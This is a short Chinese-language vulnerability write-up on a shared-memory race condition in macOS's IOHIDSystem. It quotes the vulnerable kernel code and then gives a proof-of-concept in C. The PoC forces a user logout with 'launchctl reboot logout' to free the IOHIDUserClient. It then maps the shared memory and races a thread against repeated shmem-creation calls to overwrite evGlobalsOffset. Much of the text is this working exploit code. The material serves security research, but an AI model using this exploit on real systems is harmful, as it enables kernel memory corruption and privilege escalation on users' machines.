# 共享内存条件竞争漏洞



## 漏洞分析
首先，漏洞在IOHIDSystem类里面，里面提供的IOHIDUserClientk用户端。
```
int  i;
EvOffsets *eop;
int oldFlags = 0;

/* top of sharedMem is EvOffsets structure */
eop = (EvOffsets *) shmem_addr;

if (!clean) {
    oldFlags = ((EvGlobals *)((char *)shmem_addr + sizeof(EvOffsets)))->eventFlags;
}

bzero( (void*)shmem_addr, shmem_size);

/* fill in EvOffsets structure */
eop->evGlobalsOffset = sizeof(EvOffsets);
eop->evShmemOffset = eop->evGlobalsOffset + sizeof(EvGlobals);

/* find pointers to start of globals and private shmem region */
evg = (EvGlobals *)((char *)shmem_addr + eop->evGlobalsOffset);
evs = (void *)((char *)shmem_addr + eop->evShmemOffset);
```
在给evGlobalsOffset = sizeof(EvOffsets);赋值之后，用户可以通过共享内存修改这个数值，从而造成地址被修改为我们想要的数据。



## 问题

这里有个问题，系统只能有一个客户端，并且这个客户端被windowserver占有

解决方法
launchctl reboot logout
注销用户，从而关闭客户端，打开我们的



## poc
```
   signal(SIGTERM, &ignore);
    signal(SIGHUP, &ignore);

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"));
    LOG("IOHIDSystem: %x", service);
    if(!MACH_PORT_VALID(service)) return -1;

    r = system("/bin/launchctl reboot logout");
    LOG("launchctl: %s", r == 0 ? "success" : strerror(r));
    if(r != 0) return -1;

    io_connect_t client = MACH_PORT_NULL;
    LOG("Waiting for IOHIDUserClient...");
    do
    {
        ret = IOServiceOpen(service, self, kIOHIDServerConnectType, &client);
        usleep(10);
    } while(ret == kIOReturnBusy);
    LOG("IOHIDUserClient: %x, %s", client, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(client)) return -1;

    mach_vm_address_t shmem_addr = 0;
    mach_vm_size_t shmem_size = 0;
    ret = IOConnectMapMemory64(client, kIOHIDGlobalMemory, self, &shmem_addr, &shmem_size, kIOMapAnywhere);
    //设置共享内存
    LOG("Shmem: 0x%016llx-0x%016llx, %s", shmem_addr, shmem_addr + shmem_size, mach_error_string(ret));
    if(ret != KERN_SUCCESS) return -1;

    pthread_t th;
    pthread_create(&th, NULL, &bg, (void*)&((EvOffsets*)shmem_addr)->evGlobalsOffset);

    while(1)
    {
        IOConnectCallScalarMethod(client, IOHID_CREATE_SHMEM, &SHMEM_VERSION, 1, NULL, NULL);
    }//不断试图修改数据

```
